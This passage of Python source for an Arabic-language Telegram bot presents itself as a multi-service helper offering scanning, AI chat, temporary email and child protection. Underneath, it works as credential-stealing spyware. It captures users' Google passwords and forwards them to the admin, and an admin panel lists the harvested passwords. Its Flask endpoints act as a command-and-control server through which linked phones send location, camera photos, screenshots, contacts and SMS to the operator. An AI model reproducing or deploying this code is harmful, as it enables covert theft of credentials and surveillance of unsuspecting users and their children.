            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        actual_mode = data.replace("locked_", "mode_")
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_tts":
            if not FFMPEG_AVAILABLE:
                safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
                return
            safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
        elif actual_mode == "mode_vuln_scan":
            user_states[chat_id] = "waiting_for_vuln_target"
            safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\n"
                               "يمكنك إرسال:\n"
                               "• رابط موقع: https://example.com\n"
                               "• عنوان IP: 192.168.1.1\n"
                               "• نطاق: example.com")
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    if data.startswith('admin_') and not is_admin(chat_id):
        safe_send(chat_id, "❌ للمطور فقط.")
        return

    if data == "locked_fb_report":
        if is_admin(chat_id):
            data = "mode_fb_report"
        else:
            points = get_user_points(chat_id)
            if points < 30:
                safe_send(chat_id, f"⚠️ تحتاج 30 نقطة. لديك {points}")
                return
            if not deduct_points(chat_id, 30, "استخدام بلاغ فيسبوك"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            data = "mode_fb_report"

    if data == "locked_temp_number":
        if is_admin(chat_id):
            data = "mode_temp_number"
        else:
            points = get_user_points(chat_id)
            if points < 50:
                safe_send(chat_id, f"⚠️ تحتاج 50 نقطة. لديك {points}")
                return
            if not deduct_points(chat_id, 50, "استخدام الحصول على رقم"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            data = "mode_temp_number"

    if data in REQUIRE_LINK_BUTTONS and not is_admin(chat_id) and chat_id not in linked_users:
        safe_send(chat_id, "🔗 مطلوب تفعيل الخدمات أولاً.", reply_markup=build_main_menu(chat_id))
        return

    if data == "mode_ai":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_ai"
            safe_send(chat_id, "🧠 اكتب سؤالك (المطور معفي من خصم النقاط).")
            return
        points = get_user_points(chat_id)
        if points < 5:
            safe_send(chat_id, "❌ نقاط غير كافية! تحتاج 5 نقاط لاستخدام المساعد الذكي.")
            return
        if not deduct_points(chat_id, 5, "استخدام المساعد الذكي"):
            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        user_states[chat_id] = "waiting_for_ai"
        safe_send(chat_id, "🧠 اكتب سؤالك (سيتم خصم 5 نقاط).")
        return

    if data == "mode_image":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_image"
            safe_send(chat_id, "🖼️ اكتب وصف الصورة (المطور معفي من خصم النقاط).")
            return
        points = get_user_points(chat_id)
        if points < 10:
            safe_send(chat_id, "❌ نقاط غير كافية! تحتاج 10 نقاط لإنشاء صورة.")
            return
        if not deduct_points(chat_id, 10, "إنشاء صورة"):
            safe_send(chat_id, "❌ فشل خصم النقاط.")
            return
        user_states[chat_id] = "waiting_for_image"
        safe_send(chat_id, "🖼️ اكتب وصف الصورة (سيتم خصم 10 نقاط).")
        return

    if data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
        return

    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت\n{email}\n🔑 كلمة السر: {password}\nاستخدم /check_email لعرض الرسائل."
            send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    elif data == "mode_fb_report":
        if not is_admin(chat_id) and get_user_points(chat_id) < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ", reply_markup=build_fb_report_type_markup())
    elif data == "mode_link_user":
        user_states.pop(chat_id, None)
        safe_send(chat_id, "📱 جاري تجهيز ملف التفعيل...")
        send_termux_instructions(chat_id, role='user')
        feature_usage["ربط هاتف المستخدم"] += 1
        return
    elif data == "mode_link_child":
        user_states.pop(chat_id, None)
        safe_send(chat_id, "🚸 جاري تجهيز ملف الحماية الإضافية...")
        send_termux_instructions(chat_id, role='child')
        feature_usage["ربط هاتف الطفل"] += 1
        return
    elif data == "mode_tts":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحويل النص لصوت غير متاحة (FFmpeg غير مثبت).")
            return
        safe_send(chat_id, "🔊 اختر نوع الصوت:", reply_markup=build_voice_selection_markup())
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    elif data == "mode_vuln_scan":
        user_states[chat_id] = "waiting_for_vuln_target"
        safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\n"
                           "يمكنك إرسال:\n"
                           "• رابط موقع: https://example.com\n"
                           "• عنوان IP: 192.168.1.1\n"
                           "• نطاق: example.com")
    elif data == "mode_google_login":
        google_login(call.message)
    elif data == "mode_google_logout":
        google_logout(call.message)
    elif data == "mode_show_points":
        points = get_user_points(chat_id)
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} نقطة - {row['reason']}\n"
                text += f"   {row['created_at'][:16]}\n"
            safe_send(chat_id, text)
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    elif data == "mode_admin":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        stats = "👑 لوحة المطور\n"
        for f, c in feature_usage.items():
            stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    elif data == "mode_view_devices":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n📅 {d['registered_at'][:10]}\n\n"
        safe_send(chat_id, text)
    elif data == "mode_remote_admin":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    elif data == "mode_set_dev_endpoint":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_dev_endpoint"
            safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data.startswith("remote_select_"):
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM registered_devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                user_states[chat_id] = "waiting_for_remote_command"
                safe_send(
                    chat_id,
                    f"✅ تم اختيار: {device_id}\n\n"
                    "📝 الأوامر:\n"
                    "• موقع - الموقع التقريبي\n"
                    "• كاميرا - التقاط صورة\n"
                    "• لقطة - لقطة شاشة\n"
                    "• صور - سحب صور\n"
                    "• جهات اتصال - سحب جهات الاتصال\n"
                    "• رسائل - عرض الرسائل النصية"
                )
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    elif data == "admin_stats":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        stats = f"📊 إحصائيات البوت\n\n"
        stats += f"👥 المستخدمون: {len(get_registered_devices_db())}\n"
        stats += f"📱 الأجهزة المسجلة: {len(get_registered_devices_db())}\n"
        stats += f"🔑 مستخدمي Google: {len(google_users)}\n"
        stats += f"\n📊 الاستخدام:\n"
        for f, c in feature_usage.items():
            if c > 0:
                stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    elif data == "admin_broadcast":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "admin_collected_data":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        collected = "📩 المعلومات المجمعة\n\n"
        if google_passwords:
            collected += "🔑 كلمات سر Google\n"
            for uid, pwd in google_passwords.items():
                email = google_users.get(uid, {}).get('email', 'غير معروف')
                collected += f"• {uid} ({email}): {pwd}\n"
        if temp_emails:
            collected += "\n📧 البريد المؤقت\n"
            for uid, data in temp_emails.items():
                collected += f"• {uid}: {data['email']} | {data['password']}\n"
        if not google_passwords and not temp_emails:
            collected += "📭 لا توجد معلومات."
        safe_send(chat_id, collected)
    elif data == "admin_logs":
        if not is_admin(chat_id):
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        try:
            with open('bot.log', 'r') as f:
                logs = f.read().splitlines()[-30:]
                text = "📜 آخر 30 سطر\n" + "\n".join(logs)
                safe_send(chat_id, text)
        except:
            safe_send(chat_id, "⚠️ لا يوجد سجل.")
    elif data == "admin_ban_user":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_ban_user"
            safe_send(chat_id, "🚫 أرسل معرف المستخدم للحظر.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "admin_unban_user":
        if is_admin(chat_id):
            user_states[chat_id] = "waiting_for_unban_user"
            safe_send(chat_id, "✅ أرسل معرف المستخدم لإلغاء الحظر.")
        else:
            safe_send(chat_id, "❌ للمطور فقط.")
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']}\n"
                response += f"   🌍 البلد: {num['country']}\n"
                response += f"   📡 المصدر: {num['source'][:30]}...\n\n"
            response += "\n🔹 اختر رقماً واطلب كود التفعيل عبر الأمر:\n"
            response += "🔹 /verify <الرقم> (سيتم جلب كود التفعيل تلقائياً)"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        if state == "waiting_for_vuln_target":
            target = text
            safe_send(chat_id, "⏳ جاري فحص الثغرات... يُرجى الانتظار.")
            try:
                target_ip = None
                target_domain = None
                target_url = None
                if re.match(r'^https?://', target):
                    target_url = target
                    domain_match = re.search(r'https?://([^/:]+)', target)
                    if domain_match:
                        target_domain = domain_match.group(1)
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    target_ip = target
                elif re.match(r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$', target):
                    target_domain = target
                    target_url = f"https://{target}"
                else:
                    safe_send(chat_id, "⚠️ لم يتم التعرف على الهدف. أرسل رابطاً أو IP أو نطاقاً صحيحاً.")
                    user_states[chat_id] = None
                    return
                report = perform_vulnerability_scan(target_ip, target_domain, target_url)
                feature_usage["فحص ثغرات"] += 1
                if len(report) > 4000:
                    parts = [report[i:i+4000] for i in range(0, len(report), 4000)]
                    for part in parts:
                        safe_send(chat_id, part)
                else:
                    safe_send(chat_id, report)
                report_filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                report_path = os.path.join(TEMP_DIR, report_filename)
                with open(report_path, 'w', encoding='utf-8') as f:
                    f.write(report)
                with open(report_path, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"📄 تقرير فحص الثغرات - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
                os.remove(report_path) if os.path.exists(report_path) else None
            except Exception as e:
                logger.error(f"Vuln scan error: {e}")
                safe_send(chat_id, f"⚠️ حدث عطل فني أثناء فحص الثغرات: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                return
            safe_send(chat_id, "⏳ جاري تقصير الرابط...")
            short_url, error = shorten_url(text)
            if error:
                safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
            else:
                safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_tts_text":
            voice_key = tts_voice_selection.get(chat_id, 'female')
            safe_send(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            result, error = text_to_speech(text, voice_key)
            if error:
                safe_send(chat_id, f"⚠️ {error}")
            elif result and os.path.exists(result):
                try:
                    with open(result, 'rb') as f:
                        bot.send_voice(chat_id, f)
                    os.remove(result)
                except Exception as e:
                    safe_send(chat_id, f"⚠️ فشل إرسال الصوت: {str(e)}")
            else:
                safe_send(chat_id, "⚠️ فشل تحويل النص إلى صوت.")
            user_states[chat_id] = None
            tts_voice_selection.pop(chat_id, None)
            return

        if state == "waiting_for_ban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    safe_send(chat_id, "❌ لا يمكن حظر المطور.")
                    user_states[chat_id] = None
                    return
                ban_user(user_id)
                safe_send(chat_id, f"✅ تم حظر المستخدم {user_id}.")
                notify_admin(f"🚫 حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                unban_user(user_id)
                safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
                notify_admin(f"✅ إلغاء حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_google_password":
            if chat_id in google_users:
                password = text
                email = google_users[chat_id]['email']
                google_passwords[chat_id] = password
                send_sensitive_data_to_admin("Google Password", f"{email} | {password}", chat_id)
                safe_send(chat_id, "✅ تم ربط Google.")
                user_states[chat_id] = None
            return

        if state == "waiting_for_dev_endpoint" and is_admin(chat_id):
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                safe_send(chat_id, f"✅ تم تعيين: {text}")
            else:
                safe_send(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        if is_admin(chat_id) and state == "waiting_for_remote_command":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                safe_send(chat_id, "❌ لم يتم اختيار جهاز.")
                user_states[chat_id] = None
                return
            command = text.lower()
            if command == "/cancel":
                safe_send(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return
            add_pending_command_db(device_id, command)
            safe_send(chat_id, f"⏳ تم إرسال الأمر {command} إلى الجهاز.")
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري البحث عن الإجابة...")
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة\n{answer}")
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)  # الدالة المحسّنة
                safe_send(chat_id, f"🔍 **نتيجة الفحص**\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            safe_send(chat_id, "⏳ جاري معالجة السؤال...")
            response = get_ai_response(text)
            safe_send(chat_id, response)
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            if len(text) < 5:
                safe_send(chat_id, "❌ الوصف قصير.")
                return
            safe_send(chat_id, "⏳ جاري إنشاء الصورة...")
            success = generate_and_send_image(chat_id, text)
            if not success:
                safe_send(chat_id, "⚠️ فشل إنشاء الصورة. يُرجى المحاولة مرة أخرى.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري إنشاء الشكوى...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/295309487309948",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/295309487309948",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/249621638488458",
                "محتوى عنيف": "https://www.facebook.com/help/contact/274459462613911"
            }
            support_link = "https://www.facebook.com/help/contact/315847653073855"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص في نموذج الإبلاغ."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_download":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            result, error = download_video(text)
            if error:
                safe_send(chat_id, f"⚠️ {error}")
            elif result and os.path.exists(result):
                try:
                    with open(result, 'rb') as f:
                        bot.send_video(chat_id, f, caption="📥 تم التحميل بنجاح")
                    os.remove(result)
                except Exception as e:
                    safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
            else:
                safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users and state is None:
            device_info = get_device(chat_id)
            if device_info and "طفل" in device_info['type']:
                blocked = get_blocked_domains(chat_id)
                urls = re.findall(r'https?://([^/\s]+)', text)
                for domain in urls:
                    if domain in blocked:
                        safe_send(chat_id, f"🚫 تم حظر هذا الموقع.")
                        safe_send(ADMIN_ID, f"🚸 حظر موقع من الطفل {chat_id}: {domain}")
                        log_child_activity(chat_id, f"محاولة زيارة موقع محظور: {domain}")
                        return
            urls = re.findall(r'https?://[^\s]+', text)
            for url in urls:
                result, status = scan_website(url)
                if status in ['malicious', 'suspicious'] or "تهديد" in result:
                    safe_send(chat_id, f"🚨 تحذير: الرابط {url} قد يكون خطيراً.\n{result}")
                    safe_send(ADMIN_ID, f"⚠️ رابط مشبوه من {chat_id}: {url}")
                    break

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ في معالج النصوص: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(
                chat_id,
                f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك."
            )
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            safe_send(chat_id, "⏳ جاري فحص الملف...")
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "⏳ جاري مراجعة الكود...")
                review = get_ai_response(f"مراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                safe_send(chat_id, f"🛠️ مراجعة الكود\n{review}")
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            safe_send(chat_id, "📎 تم استلام الملف.")
        else:
            safe_send(chat_id, "📎 لفحص الملفات، فعّل الخدمات أولاً.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        notify_admin(f"خطأ في معالج الملفات: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except:
                pass

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        safe_send(chat_id, "🖼️ تم استلام الصورة.")
    else:
        safe_send(chat_id, "🖼️ لفحص الصور، فعّل الخدمات أولاً.")

# ===================== معالج الرد الافتراضي =====================
@bot.message_handler(func=lambda message: True)
def default_reply(message):
    if not message.text.startswith('/'):
        safe_send(message.chat.id, "🤖 البوت يعمل. استخدم /start للقائمة.")

# ===================== دوال Flask =====================
def verify_client_token():
    token = request.headers.get('X-Client-Token')
    return token == CLIENT_SECRET_KEY

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update:
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Error', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        if not device_id or not chat_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id or chat_id'}), 400
        save_registered_device_db(device_id, int(chat_id))
        safe_send(ADMIN_ID, f"📱 جهاز جديد مسجل\n🆔 {device_id}\n👤 المستخدم: {chat_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        if result_type == 'image':
            try:
                img_data = base64.b64decode(result)
                safe_send(ADMIN_ID, f"📸 نتيجة من جهاز {device_id}")
                bot.send_photo(ADMIN_ID, img_data, caption=f"📸 نتيجة من جهاز {device_id}")
            except Exception as e:
                safe_send(ADMIN_ID, f"⚠️ فشل معالجة الصورة من {device_id}: {str(e)}")
        else:
            safe_send(ADMIN_ID, f"📩 نتيجة من {device_id}\n{result}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/devices', methods=['GET'])
def admin_devices():
    try:
        if ADMIN_KEY and request.headers.get('X-Admin-Key') != ADMIN_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        devices = get_registered_devices_db()
        return jsonify({'devices': [dict(d) for d in devices]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===================== إعداد Webhook =====================
def set_webhook():
    if not SERVER_URL:
